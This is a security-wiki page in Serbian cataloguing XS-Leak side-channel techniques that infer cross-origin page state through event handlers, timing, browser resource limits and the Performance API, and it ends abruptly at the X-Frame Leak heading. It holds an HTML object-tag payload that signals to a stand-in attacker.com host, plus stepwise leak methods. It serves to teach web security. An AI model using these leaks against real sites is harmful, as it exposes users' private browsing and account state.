# XS-Search/XS-Leaks

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

XS-Search je metoda koja se koristi za **izvlačenje informacija sa različitih izvora** koristeći **ranjivosti bočnih kanala**.

Ključne komponente uključene u ovaj napad uključuju:

- **Ranjivi Web**: Ciljna veb stranica sa koje se informacije nameravaju izvući.
- **Napadačev Web**: Zlonamerna veb stranica koju je kreirao napadač, koju žrtva posećuje, a koja sadrži eksploataciju.
- **Metod uključivanja**: Tehnika koja se koristi za uključivanje Ranjivog Web-a u Napadačev Web (npr. window.open, iframe, fetch, HTML tag sa href, itd.).
- **Tehnika curenja**: Tehnike koje se koriste za uočavanje razlika u stanju Ranjivog Web-a na osnovu informacija prikupljenih putem metode uključivanja.
- **Stanja**: Dva moguća stanja Ranjivog Web-a koja napadač želi da razlikuje.
- **Uočljive razlike**: Opservabilne varijacije na koje se napadač oslanja da bi zaključio stanje Ranjivog Web-a.

### Uočljive razlike

Nekoliko aspekata može se analizirati kako bi se razlikovala stanja Ranjivog Web-a:

- **Status kod**: Razlikovanje između **različitih HTTP status kodova** sa različitih izvora, kao što su greške servera, greške klijenta ili greške autentifikacije.
- **Korišćenje API-ja**: Identifikacija **korišćenja Web API-ja** na stranicama, otkrivajući da li stranica sa različitih izvora koristi određeni JavaScript Web API.
- **Preusmeravanja**: Otkrivanje navigacija ka različitim stranicama, ne samo HTTP preusmeravanjima, već i onima koje pokreće JavaScript ili HTML.
- **Sadržaj stranice**: Posmatranje **varijacija u telu HTTP odgovora** ili u podresursima stranice, kao što su **broj ugnježdenih okvira** ili razlike u veličini slika.
- **HTTP zaglavlje**: Zapažanje prisustva ili moguće vrednosti **određenog HTTP odgovora zaglavlja**, uključujući zaglavlja kao što su X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
- **Vreme**: Uočavanje doslednih vremenskih razlika između dva stanja.

### Metodi uključivanja

- **HTML elementi**: HTML nudi različite elemente za **uključivanje resursa sa različitih izvora**, kao što su stilovi, slike ili skripte, primoravajući pregledač da zatraži ne-HTML resurs. Kompilacija potencijalnih HTML elemenata za ovu svrhu može se naći na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Okviri**: Elementi kao što su **iframe**, **object** i **embed** mogu direktno ugraditi HTML resurse u napadačevu stranicu. Ako stranica **nema zaštitu od uokvirivanja**, JavaScript može pristupiti objektu prozora u okviru putem svojstva contentWindow.
- **Iskočne prozore**: Metod **`window.open`** otvara resurs u novoj kartici ili prozoru, pružajući **handle prozora** za JavaScript da komunicira sa metodama i svojstvima prema SOP-u. Iskočni prozori, često korišćeni u jedinstvenom prijavljivanju, zaobilaze ograničenja uokvirivanja i kolačića ciljanog resursa. Međutim, moderni pregledači ograničavaju kreiranje iskočnih prozora na određene korisničke akcije.
- **JavaScript zahtevi**: JavaScript omogućava direktne zahteve ka ciljnim resursima koristeći **XMLHttpRequests** ili **Fetch API**. Ove metode nude preciznu kontrolu nad zahtevom, kao što je opcija da se prati HTTP preusmeravanje.

### Tehnike curenja

- **Handler događaja**: Klasična tehnika curenja u XS-Leaks, gde handleri događaja kao što su **onload** i **onerror** pružaju uvide o uspehu ili neuspehu učitavanja resursa.
- **Poruke o grešci**: JavaScript izuzeci ili posebne stranice o grešci mogu pružiti informacije o curenju ili direktno iz poruke o grešci ili razlikovanjem između njenog prisustva i odsustva.
- **Globalna ograničenja**: Fizička ograničenja pregledača, kao što su kapacitet memorije ili druga nametnuta ograničenja pregledača, mogu signalizirati kada je dostignut prag, služeći kao tehnika curenja.
- **Globalno stanje**: Uočljive interakcije sa **globalnim stanjima** pregledača (npr. interfejs istorije) mogu se iskoristiti. Na primer, **broj unosa** u istoriji pregledača može pružiti tragove o stranicama sa različitih izvora.
- **Performanse API**: Ovaj API pruža **detalje o performansama trenutne stranice**, uključujući mrežno vreme za dokument i učitane resurse, omogućavajući zaključke o traženim resursima.
- **Čitljiva svojstva**: Neka HTML svojstva su **čitljiva sa različitih izvora** i mogu se koristiti kao tehnika curenja. Na primer, svojstvo `window.frame.length` omogućava JavaScript-u da prebroji okvire uključene u veb stranicu sa različitih izvora.

## XSinator alat i rad

XSinator je automatski alat za **proveru pregledača protiv nekoliko poznatih XS-Leaks** objašnjenih u njegovom radu: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Možete **pristupiti alatu na** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Isključeni XS-Leaks**: Morali smo da isključimo XS-Leaks koji se oslanjaju na **servisne radnike** jer bi ometali druga curenja u XSinator-u. Pored toga, odlučili smo da **isključimo XS-Leaks koji se oslanjaju na pogrešne konfiguracije i greške u specifičnoj veb aplikaciji**. Na primer, pogrešne konfiguracije CrossOrigin Resource Sharing (CORS), curenje postMessage ili Cross-Site Scripting. Takođe, isključili smo vremenski zasnovane XS-Leaks jer često pate od sporosti, buke i netačnosti.

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## **Tehnike zasnovane na vremenu**

Neke od sledećih tehnika će koristiti vreme kao deo procesa za otkrivanje razlika u mogućim stanjima veb stranica. Postoje različiti načini za merenje vremena u veb pregledaču.

**Sati**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API omogućava programerima da dobiju merenja vremena visoke rezolucije.\
Postoji značajan broj API-ja koje napadači mogu zloupotrebiti za kreiranje implicitnih satova: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike handlera događaja

### Onload/Onerror

- **Metodi uključivanja**: Okviri, HTML elementi
- **Uočljiva razlika**: Status kod
- **Više informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Sažetak**: Ako pokušavate da učitate resurs, onerror/onload događaji se aktiviraju kada je resurs učitan uspešno/neuspešno, moguće je utvrditi status kod.
- **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
xs-search/cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Primer koda pokušava da **učita skripte iz JS**, ali **drugi tagovi** kao što su objekti, stilovi, slike, audio takođe mogu biti korišćeni. Štaviše, takođe je moguće direktno injektovati **tag** i deklarisati `onload` i `onerror` događaje unutar taga (umesto da ih injektujete iz JS).

Postoji takođe verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom slučaju, ako `example.com/404` nije pronađen, učitaće se `attacker.com/?error`.

### Onload Timing

- **Metode uključivanja**: HTML elementi
- **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, statusnog koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Sažetak:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** može se koristiti za merenje koliko vremena je potrebno za izvršavanje zahteva. Međutim, mogu se koristiti i drugi satovi, kao što je [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji može identifikovati zadatke koji traju duže od 50ms.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) još jedan primer u:

{{#ref}}
xs-search/performance.now-example.md
{{#endref}}

#### Onload Timing + Prisilna teška radnja

Ova tehnika je slična prethodnoj, ali **napadač** će takođe **prisiliti** neku akciju da traje **relevantno vreme** kada je **odgovor pozitivan ili negativan** i izmeriti to vreme.

{{#ref}}
xs-search/performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Metode uključivanja**: Okviri
- **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, statusnog koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Sažetak:** [SharedArrayBuffer sat](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) može se koristiti za merenje koliko vremena je potrebno za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa može se meriti korišćenjem [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) događaja. **`beforeunload`** događaj se aktivira kada se pregledač sprema da pređe na novu stranicu, dok se **`unload`** događaj dešava kada se navigacija zapravo odvija. Vremenska razlika između ova dva događaja može se izračunati kako bi se odredila **dužina vremena koje je pregledač potrošio na preuzimanje resursa**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Metode uključivanja**: Okviri
- **Uočljiva razlika**: Vreme (generalno zbog sadržaja stranice, statusnog koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Sažetak:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API može se koristiti za merenje koliko vremena je potrebno za izvršavanje zahteva. Mogu se koristiti i drugi satovi.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Primećeno je da u odsustvu [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za učitavanje stranice i njenih podresursa preko mreže može meriti napadač. Ova merenja su obično moguća jer se `onload` handler iframe-a aktivira tek nakon završetka učitavanja resursa i izvršavanja JavaScript-a. Da bi se zaobišla varijabilnost koju uvodi izvršavanje skripti, napadač može koristiti [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) atribut unutar `<iframe>`. Uključivanje ovog atributa ograničava brojne funkcionalnosti, posebno izvršavanje JavaScript-a, čime se olakšava merenje koje je pretežno pod uticajem mrežne performanse.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sadržaj stranice
- **More info**:
- **Summary**: Ako možete izazvati grešku na stranici kada se pristupi ispravnom sadržaju i učiniti da se učita ispravno kada se pristupi bilo kojem sadržaju, tada možete napraviti petlju za ekstrakciju svih informacija bez merenja vremena.
- **Code Example**:

Pretpostavimo da možete **ubaciti** **stranicu** koja ima **tajni** sadržaj **unutar Iframe-a**.

Možete **naterati žrtvu da pretražuje** datoteku koja sadrži "_**flag**_" koristeći **Iframe** (na primer, eksploatacijom CSRF-a). Unutar Iframe-a znate da će se _**onload događaj**_ **izvršiti uvek barem jednom**. Tada možete **promeniti** **URL** **iframe-a** menjajući samo **sadržaj** **hash-a** unutar URL-a.

Na primer:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Ako je prvi URL **uspešno učitan**, tada, kada **promenite** deo **hash-a** URL-a, **onload** događaj **neće biti ponovo aktiviran**. Ali **ako** je stranica imala neku vrstu **greške** prilikom **učitavanja**, tada će se **onload** događaj **ponovo aktivirati**.

Tada možete **razlikovati** između **ispravno** učitane stranice ili stranice koja ima **grešku** kada se pristupi.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sadržaj stranice
- **More info**:
- **Summary:** Ako **stranica** **vraća** **osetljiv** sadržaj, **ili** sadržaj koji može biti **kontrolisan** od strane korisnika. Korisnik može postaviti **validan JS kod u negativnom slučaju**, **učitavajući** svaki pokušaj unutar **`<script>`** tagova, tako da u **negativnim** slučajevima **kod** napadača **bude izvršen**, a u **afirmativnim** slučajevima **ništa** neće biti izvršeno.
- **Code Example:**

{{#ref}}
xs-search/javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status kod & zaglavlja
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** je bezbednosna mera koja sprečava web stranice da učitavaju određene osetljive resurse sa drugih domena kako bi se zaštitili od napada poput **Spectre**. Međutim, napadači mogu iskoristiti njegovo zaštitno ponašanje. Kada odgovor podložan **CORB** vrati _**CORB zaštićen**_ `Content-Type` sa `nosniff` i `2xx` status kodom, **CORB** uklanja telo i zaglavlja odgovora. Napadači koji to posmatraju mogu da zaključe kombinaciju **status koda** (koji označava uspeh ili grešku) i `Content-Type` (koji označava da li je zaštićen od **CORB**), što može dovesti do potencijalnog curenja informacija.
- **Code Example**:

Proverite link za više informacija o napadu.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sadržaj stranice
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Curiti osetljive podatke iz id ili name atributa.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Moguće je **učitati stranicu** unutar **iframe-a** i koristiti **`#id_value`** da se stranica **fokusira na element** iframe-a sa naznačenim id, zatim, ako se aktivira **`onblur`** signal, ID element postoji.\
Možete izvršiti isti napad sa **`portal`** tagovima.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Prikupiti osetljive informacije iz postMessage ili koristiti prisustvo postMessages kao orakl da saznate status korisnika na stranici
- **Code Example**: `Any code listening for all postMessages.`

Aplikacije često koriste [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju između različitih domena. Međutim, ova metoda može nenamerno otkriti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, omogućavajući bilo kojem prozoru da primi poruke. Štaviše, sam čin primanja poruke može delovati kao **orakl**; na primer, određene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka može otkriti informacije o stanju ili identitetu korisnika, kao što je da li su autentifikovani ili ne.

<figure><img src="../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane od strane **najnaprednijih** alata zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Iscrpljivanje limita WebSocket konekcije curi broj WebSocket konekcija stranice sa drugog domena.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

Moguće je identifikovati da li, i koliko, **WebSocket konekcija ciljne stranice koristi**. To omogućava napadaču da detektuje stanja aplikacije i curi informacije vezane za broj WebSocket konekcija.

Ako jedan **domen** koristi **maksimalan broj WebSocket** objekata konekcije, bez obzira na stanje njihovih konekcija, kreiranje **novih objekata će rezultirati JavaScript izuzecima**. Da bi izvršio ovaj napad, napadačev sajt otvara ciljni sajt u iskačućem prozoru ili iframe-u, a zatim, nakon što se ciljni web učita, pokušava da kreira maksimalan broj WebSocket konekcija mogućih. **Broj izbačenih izuzetaka** je **broj WebSocket konekcija koje koristi prozor ciljnog sajta**.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Detektovati Payment Request jer samo jedan može biti aktivan u isto vreme.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ova XS-Leak omogućava napadaču da **detektuje kada stranica sa drugog domena inicira zahtev za plaćanje**.

Pošto **samo jedan zahtev za plaćanje može biti aktivan** u isto vreme, ako ciljni sajt koristi Payment Request API, svaki dalji pokušaj da se koristi ovaj API će propasti, i izazvati **JavaScript izuzetak**. Napadač može iskoristiti ovo tako što će **periodično pokušavati da prikaže UI Payment API**. Ako jedan pokušaj izazove izuzetak, ciljni sajt ga trenutno koristi. Napadač može sakriti ove periodične pokušaje tako što će odmah zatvoriti UI nakon kreiranja.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Vreme (generalno zbog Sadržaja stranice, Status koda)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Merenje vremena izvršenja web-a zloupotrebljavajući jednonitni JS event loop.
- **Code Example**:

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript funkcioniše na [jednonitnom event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) modelu konkurencije, što znači da **može izvršiti samo jedan zadatak u isto vreme**. Ova karakteristika se može iskoristiti za procenu **koliko dugo kod sa drugog domena traje da se izvrši**. Napadač može meriti vreme izvršenja svog koda u event loop-u kontinuiranim slanjem događaja sa fiksnim svojstvima. Ovi događaji će biti obrađeni kada je event pool prazan. Ako drugi domeni takođe šalju događaje u isti pool, **napadač može zaključiti vreme koje je potrebno za izvršavanje ovih spoljašnjih događaja posmatrajući kašnjenja u izvršenju svojih zadataka**. Ova metoda praćenja event loop-a za kašnjenja može otkriti vreme izvršenja koda sa različitih domena, potencijalno izlažući osetljive informacije.

> [!WARNING]
> U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobile **preciznije merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Vreme (generalno zbog Sadržaja stranice, Status koda)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Jedna metoda za merenje vremena izvršenja web operacije uključuje namerno blokiranje event loop-a niti i zatim merenje **koliko dugo traje da event loop ponovo postane dostupan**. Umetanjem blokirajuće operacije (kao što je dugo računanje ili sinhroni API poziv) u event loop, i praćenjem vremena koje je potrebno da započnu izvršenje naredni kod, može se zaključiti trajanje zadataka koji su se izvršavali u event loop-u tokom blokirajućeg perioda. Ova tehnika koristi jednonitnu prirodu JavaScript-ovog event loop-a, gde se zadaci izvršavaju sekvencijalno, i može pružiti uvide u performanse ili ponašanje drugih operacija koje dele istu nit.
- **Code Example**:

Značajna prednost tehnike merenja vremena izvršenja blokiranjem event loop-a je njena potencijalna sposobnost da zaobiđe **Site Isolation**. **Site Isolation** je bezbednosna funkcija koja razdvaja različite web stranice u odvojene procese, s ciljem da spreči zlonamerne sajtove da direktno pristupaju osetljivim podacima sa drugih sajtova. Međutim, utičući na vreme izvršenja drugog domena kroz zajednički event loop, napadač može indirektno izvući informacije o aktivnostima tog domena. Ova metoda ne zavisi od direktnog pristupa podacima drugog domena, već posmatra uticaj aktivnosti tog domena na zajednički event loop, čime se izbegavaju zaštitne barijere koje postavlja **Site Isolation**.

> [!WARNING]
> U merenju vremena izvršenja moguće je **eliminisati** **mrežne faktore** kako bi se dobile **preciznije merenja**. Na primer, učitavanjem resursa koji se koriste na stranici pre njenog učitavanja.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Vreme (generalno zbog Sadržaja stranice, Status koda)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Napadač može zaključati sve sokete osim 1, učitati ciljni web i u isto vreme učitati drugu stranicu, vreme do kada se poslednja stranica počinje učitavati je vreme koje je ciljna stranica uzela da se učita.
- **Code Example**:

{{#ref}}
xs-search/connection-pool-example.md
{{#endref}}

Pregledači koriste sokete za komunikaciju sa serverom, ali zbog ograničenih resursa operativnog sistema i hardvera, **pregledači su primorani da postave limit** na broj istovremenih soketa. Napadači mogu iskoristiti ovo ograničenje kroz sledeće korake:

1. Utvrditi limit soketa pregledača, na primer, 256 globalnih soketa.
2. Zauzeti 255 soketa na duži period pokretanjem 255 zahteva ka različitim hostovima, dizajniranim da drže konekcije otvorenim bez završavanja.
3. Iskoristiti 256. soket za slanje zahteva ka ciljnoj stranici.
4. Pokušati 257. zahtev ka drugom hostu. S obzirom na to da su svi soketi u upotrebi (prema koracima 2 i 3), ovaj zahtev će biti u redu dok ne postane dostupan soket. Kašnjenje pre nego što ovaj zahtev prođe daje napadaču informaciju o vremenu mrežne aktivnosti vezane za 256. soket (soket ciljne stranice). Ova inferencija je moguća jer je 255 soketa iz koraka 2 još uvek angažovano, što implicira da bilo koji novodostupni soket mora biti onaj oslobođen iz koraka 3. Vreme koje je potrebno da 256. soket postane dostupan je tako direktno povezano sa vremenom potrebnim da zahtev za ciljnu stranicu završi.

Za više informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Vreme (generalno zbog Sadržaja stranice, Status koda)
- **More info**:
- **Summary:** To je kao prethodna tehnika, ali umesto korišćenja svih soketa, Google **Chrome** postavlja limit od **6 istovremenih zahteva ka istom domenu**. Ako **blokiramo 5** i zatim **pokrenemo 6.** zahtev, možemo **izmeriti** vreme i ako uspemo da nateramo **stranicu žrtve da pošalje** više **zahteva** ka istom kraju da detektujemo **status** **stranice**, **6. zahtev** će trajati **duže** i možemo to detektovati.

## Performance API Techniques

[`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) nudi uvide u performanse web aplikacija, dodatno obogaćen [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Resource Timing API omogućava praćenje detaljnih vremenskih podataka mrežnih zahteva, kao što je trajanje zahteva. Značajno je da kada serveri uključuju `Timing-Allow-Origin: *` zaglavlje u svojim odgovorima, dodatni podaci poput veličine prenosa i vremena pretrage domena postaju dostupni.

Ova bogatstvo podataka može se dobiti putem metoda kao što su [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ili [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), pružajući sveobuhvatan pregled informacija vezanih za performanse. Pored toga, API olakšava merenje vremena izvršenja izračunavanjem razlike između vremenskih oznaka dobijenih iz [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Međutim, vredi napomenuti da za određene operacije u pregledačima poput Chrome-a, preciznost `performance.now()` može biti ograničena na milisekunde, što može uticati na preciznost merenja vremena.

Pored merenja vremena, Performance API se može iskoristiti za uvide vezane za bezbednost. Na primer, prisustvo ili odsustvo stranica u `performance` objektu u Chrome-u može ukazivati na primenu `X-Frame-Options`. Konkretno, ako je stranica blokirana od renderovanja u okviru zbog `X-Frame-Options`, ona neće biti zabeležena u `performance` objektu, pružajući suptilan trag o politikama uokvirivanja stranice.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status kod
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Zahtev koji rezultira greškama neće kreirati ulaz u vremenu resursa.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Moguće je **razlikovati između HTTP status kodova** jer zahtevi koji dovode do **greške** ne **kreiraju ulaz u performansama**.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status kod
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Zbog greške u pregledaču, zahtevi koji rezultiraju greškama učitavaju se dvaput.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

U prethodnoj tehnici takođe su identifikovana dva slučaja gde greške u GC dovode do **učitavanja resursa dvaput kada ne uspeju da se učitaju**. To će rezultirati višestrukim unosima u Performance API i tako se može detektovati.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status kod
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Zahtevi koji rezultiraju greškom ne mogu se spojiti.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Tehnika je pronađena u tabeli u pomenutom radu, ali opis tehnike nije pronađen. Međutim, možete pronaći izvorni kod koji to proverava na [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sadržaj stranice
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Prazni odgovori ne kreiraju ulaze u vremenu resursa.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Napadač može detektovati da li je zahtev rezultirao praznim HTTP odgovorom jer **prazne stranice ne kreiraju ulaz u performansama u nekim pregledačima**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sadržaj stranice
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Korišćenjem XSS Auditor-a u Security Assertions, napadači mogu detektovati specifične elemente web stranice posmatrajući promene u odgovorima kada kreirani payload-ovi aktiviraju mehanizam filtriranja auditor-a.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Security Assertions (SA), XSS Auditor, prvobitno namenjen sprečavanju napada Cross-Site Scripting (XSS), može paradoksalno biti iskorišćen za curenje osetljivih informacija. Iako je ova ugrađena funkcija uklonjena iz Google Chrome-a (GC), još uvek je prisutna u SA. U 2013. godini, Braun i Heiderich su pokazali da XSS Auditor može nenamerno blokirati legitimne skripte, što dovodi do lažnih pozitivnih rezultata. Oslanjajući se na ovo, istraživači su razvili tehnike za ekstrakciju informacija i detekciju specifičnog sadržaja na stranicama sa drugog domena, koncept poznat kao XS-Leaks, prvobitno izvešten od strane Terade i razrađen od strane Heyesa u blog postu. Iako su ove tehnike bile specifične za XSS Auditor u GC, otkriveno je da u SA, stranice blokirane od strane XSS Auditor-a ne generišu unose u Performance API, otkrivajući metodu putem koje osetljive informacije mogu i dalje biti otkrivene.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Zaglavlje
